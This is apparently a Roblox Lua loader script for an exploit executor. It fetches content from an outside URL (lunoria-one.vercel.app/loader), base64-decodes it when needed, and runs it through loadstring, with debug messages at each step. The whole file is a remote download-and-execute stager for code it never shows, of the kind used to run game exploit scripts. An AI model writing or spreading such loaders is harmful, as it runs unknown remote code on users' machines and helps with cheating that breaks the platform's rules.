local HttpService = game:GetService("HttpService")

local function dbg(msg)
    warn("[LOADER DEBUG]", msg)
end

dbg("Loader started")

local function http_request(opts)
    if http and http.request then
        dbg("Using http.request")
        return http.request(opts)
    elseif request then
        dbg("Using request")
        return request(opts)
    else
        dbg("Using HttpService:GetAsync fallback")
        return {
            Body = HttpService:GetAsync(opts.Url),
            StatusCode = 200
        }
    end
end

dbg("Sending request")

local res = http_request({
    Url = "https://lunoria-one.vercel.app/loader",
    Method = "GET"
})

if not res then
    dbg("res is nil")
    return
end

if not res.Body then
    dbg("res.Body is nil")
    return
end

dbg("Response received, length = " .. tostring(#res.Body))

-- Base64 decode (debugged)
local payload

-- Case 1: body is already binary (http.request)
if type(res.Body) == "string" and res.Body:sub(1,5) == "local" then
    dbg("Body already Lua source (no base64)")
    payload = res.Body

else
    dbg("Attempting Base64 decode")
    local ok, decoded = pcall(function()
        return HttpService:Base64Decode(res.Body)
    end)

    if not ok or not decoded then
        dbg("Base64 decode failed")
        return
    end

    payload = decoded
end


if not payload then
    dbg("payload is nil after decode")
    return
end

dbg("Payload decoded, length = " .. tostring(#payload))

if #payload == 0 then
    dbg("Payload length is 0")
    return
end

-- loadstring debug
local loader = loadstring or load
if not loader then
    dbg("loadstring/load is nil")
    return
end

dbg("Executing payload")

local ok, err = pcall(function()
    loader(payload)()
end)

if not ok then
    dbg("Payload execution error: " .. tostring(err))
else
    dbg("Payload executed successfully")
end
